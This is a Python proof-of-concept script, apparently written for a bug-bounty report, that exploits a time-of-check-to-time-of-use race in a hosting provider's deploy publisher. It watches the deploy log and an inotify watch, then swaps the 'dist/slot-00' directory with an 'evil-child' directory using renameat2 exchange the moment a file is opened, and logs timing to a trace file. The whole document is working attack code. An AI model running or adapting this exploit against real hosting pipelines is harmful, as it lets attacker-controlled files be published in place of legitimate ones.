#!/usr/bin/env python3
"""Swap a watched child directory as the publisher opens it."""

from __future__ import annotations

import ctypes
import json
import os
from pathlib import Path
import struct
import time


SYS_RENAMEAT2 = 316
AT_FDCWD = -100
RENAME_EXCHANGE = 2
IN_ACCESS = 0x00000001
IN_OPEN = 0x00000020
MARKER = b"HOSTINGER_NODE_INOTIFY_CHILDFILE_TOCTOU_GATE:r228"
PUBLISHING = b"==> Publishing"
libc = ctypes.CDLL(None, use_errno=True)
first = os.fsencode("dist/slot-00")
second = os.fsencode("evil-child")
started = time.monotonic()
deadline = started + 30.0
logs_root = Path.cwd().parents[1] / "logs"
trace = {"marker": MARKER.decode(), "event": "not-observed", "logsRootAccessible": logs_root.is_dir()}


def current_log() -> Path | None:
    try:
        candidates = sorted(logs_root.glob("*/*_deploy.log"), key=lambda item: item.stat().st_mtime_ns, reverse=True)[:8]
    except OSError:
        return None
    for candidate in candidates:
        try:
            if MARKER in candidate.read_bytes():
                return candidate
        except OSError:
            continue
    return None


def exchange() -> int:
    return libc.syscall(
        SYS_RENAMEAT2,
        AT_FDCWD,
        ctypes.c_char_p(first),
        AT_FDCWD,
        ctypes.c_char_p(second),
        RENAME_EXCHANGE,
    )


inotify_fd = libc.inotify_init1(os.O_NONBLOCK | os.O_CLOEXEC)
watch = -1
if inotify_fd >= 0:
    watch = libc.inotify_add_watch(inotify_fd, ctypes.c_char_p(first), IN_OPEN | IN_ACCESS)
trace.update(inotifyFdOk=inotify_fd >= 0, watchOk=watch >= 0)

log_path = None
while time.monotonic() < deadline and log_path is None:
    log_path = current_log()
    if log_path is None:
        time.sleep(0.0005)

if log_path is not None and watch >= 0:
    trace.update(event="current-log-found", logFoundAfterMs=round((time.monotonic() - started) * 1000, 3))
    while time.monotonic() < deadline:
        try:
            tail = log_path.read_bytes()[-4096:]
        except OSError:
            time.sleep(0.00025)
            continue
        if PUBLISHING not in tail:
            time.sleep(0.00025)
            continue
        trace.update(event="publishing-observed", publishingAfterMs=round((time.monotonic() - started) * 1000, 3))
        event_deadline = time.monotonic() + 2.0
        while time.monotonic() < event_deadline:
            try:
                event = os.read(inotify_fd, 4096)
            except BlockingIOError:
                time.sleep(0.00005)
                continue
            except OSError:
                event = b""
            if not event:
                time.sleep(0.00005)
                continue
            child_name = None
            child_mask = 0
            offset = 0
            while offset + 16 <= len(event):
                _, mask, _, name_length = struct.unpack_from("iIII", event, offset)
                name_start = offset + 16
                name_end = name_start + name_length
                name = event[name_start:name_end].split(b"\0", 1)[0]
                if mask & IN_OPEN and name:
                    child_name = name.decode(errors="replace")
                    child_mask = mask
                    break
                offset = name_end
            if child_name is None:
                continue
            trace.update(
                event="child-file-open-observed",
                childFileOpenAfterMs=round((time.monotonic() - started) * 1000, 3),
                childName=child_name,
                childMask=child_mask,
                eventBytes=len(event),
            )
            result = exchange()
            trace["exchangeErrno"] = ctypes.get_errno() if result != 0 else 0
            if result == 0:
                time.sleep(0.5)
                restore = exchange()
                trace["restoreErrno"] = ctypes.get_errno() if restore != 0 else 0
            break
        break

try:
    if Path("dist/slot-00").is_symlink() and Path("evil-child").is_dir():
        exchange()
except OSError:
    pass
if inotify_fd >= 0:
    os.close(inotify_fd)
trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
try:
    trace_path = Path.home() / ".h1-r228-race-trace.json"
    trace_path.write_text(json.dumps(trace, sort_keys=True))
    trace_path.chmod(0o600)
except OSError:
    pass
